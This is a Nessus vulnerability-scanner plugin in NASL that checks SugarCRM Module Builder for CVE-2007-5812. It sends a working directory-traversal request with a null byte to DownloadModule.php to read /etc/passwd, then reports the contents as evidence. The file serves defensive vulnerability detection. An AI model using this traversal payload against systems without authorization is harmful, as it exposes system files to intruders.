#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(27597);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2007-5812");
  script_bugtraq_id(26275);
  script_osvdb_id(38414, 39068);
  script_xref(name:"EDB-ID", value:"4591");

  script_name(english:"Module Builder DownloadModule Traversal Arbitrary File Disclosure");
  script_summary(english:"Tries to read a local file with Module Builder");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Module Builder, a module for building
SugarCRM modules. 

The version of Module Builder installed on the remote host fails to
validate user-supplied input to the 'file' parameter of the
'modules/Builder/DownloadModule.php' script before using it to return
the contents of a file.  An unauthenticated, remote attacker can
exploit this issue to view arbitrary files on the remote host, subject
to the privileges of the web server user id. 

Note that unless PHP's 'magic_quotes_gpc' setting is disabled, an
attacker will only be able to retrieve files with names ending with
'.zip'." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);


 script_set_attribute(attribute:"plugin_publication_date", value: "2007/10/31");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/10/31");
 script_cvs_date("$Date: 2015/11/18 21:03:57 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:modulebuilder:modulebuilder");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2015 Tenable Network Security, Inc.");

  script_dependencies("sugarcrm_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/sugarcrm");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/sugarcrm"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../../../../etc/passwd%00";

  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/modules/Builder/DownloadModule.php?",
      "file=", file
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    contents = res;
    # nb: avoid displaying errors if "modules/Builder/cache/ModuleBuilder"
    #     directory doesn't exist and PHP's display_errors is enabled.
    while ("<br />" >< contents)
      contents = strstr(contents, "<br />") - "<br />";

    report = string(
      "Here are the contents of the file '/etc/passwd' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      contents
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
